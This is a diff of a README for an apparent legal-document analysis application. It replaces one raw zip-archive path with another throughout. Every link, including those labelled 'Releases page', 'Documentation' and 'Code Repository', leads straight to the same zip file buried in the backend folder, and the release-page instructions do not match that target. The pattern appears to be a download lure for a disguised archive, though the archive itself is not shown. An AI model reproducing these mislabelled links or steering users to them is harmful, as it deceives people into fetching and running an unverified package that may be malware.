@@ -1,6 +1,6 @@
 # 🚀 sistema-de-analisis-de-documentos-juridicos - Smart Document Analysis for Law Professionals
 
-[![Download Now](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip)
+[![Download Now](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip)
 
 ## 📜 Introduction
 
@@ -21,9 +21,9 @@ To start using the application, follow these simple steps. You don’t need any 
 
 To download the application, click the link below:
 
-[Download from Releases](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip)
+[Download from Releases](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip)
 
-1. Visit the [Releases page](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip).
 2. Find the latest release version.
 3. Click on the file that matches your operating system.
 4. Your download will begin automatically.
@@ -55,13 +55,13 @@ For additional help, you can open an issue in the repository, and our community 
 
 ## 🔄 Updates
 
-We regularly update the application to improve features and fix bugs. Make sure to check the [Releases page](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip) for the latest version and improvements.
+We regularly update the application to improve features and fix bugs. Make sure to check the [Releases page](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip) for the latest version and improvements.
 
 ## 🔗 Useful Links
 
-- [Code Repository](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip)
-- [Documentation](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip)
-- [Releases Page](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip)
+- [Code Repository](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip)
+- [Documentation](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip)
 
 ## 🎉 Acknowledgments
 
@@ -69,4 +69,4 @@ Thank you for using "sistema-de-analisis-de-documentos-juridicos." We appreciate
 
 ---
 
-[![Download Now](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/raw/refs/heads/main/backend/apps/core/services/ollama_agent/sistema_de_analisis_documentos_juridicos_v3.9.zip)
+[![Download Now](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/akbar-ops/sistema-de-analisis-de-documentos-juridicos/main/backend/de_juridicos_sistema_analisis_documentos_v2.9-alpha.5.zip)
